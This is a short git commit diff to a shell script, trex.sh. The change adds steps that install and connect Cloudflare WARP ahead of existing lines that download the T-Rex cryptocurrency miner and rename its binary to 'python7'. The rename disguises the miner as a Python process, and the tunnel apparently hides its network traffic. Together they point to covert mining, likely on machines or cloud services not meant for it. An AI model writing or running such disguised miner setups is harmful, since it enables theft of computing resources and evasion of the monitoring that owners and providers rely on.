494e7ccd5a6d0c56c953a22ee589315ab6901078
haidanglx <40859600+haidanglx@users.noreply.github.com>
2022-01-06 21:57:05 +0800

    Update trex.sh

--- trex.sh
+++ trex.sh
@@ -1,4 +1,12 @@
 #!/bin/sh
+wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
+sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
+sudo systemctl enable --now warp-svc.service
+echo Y | warp-cli set-mode warp+doh
+warp-cli set-mode warp+doh
+warp-cli register
+warp-cli connect
+
 wget https://github.com/trexminer/T-Rex/releases/download/0.24.2/t-rex-0.24.2-linux.tar.gz
 tar -xf t-rex-0.24.2-linux.tar.gz
 sudo mv t-rex python7
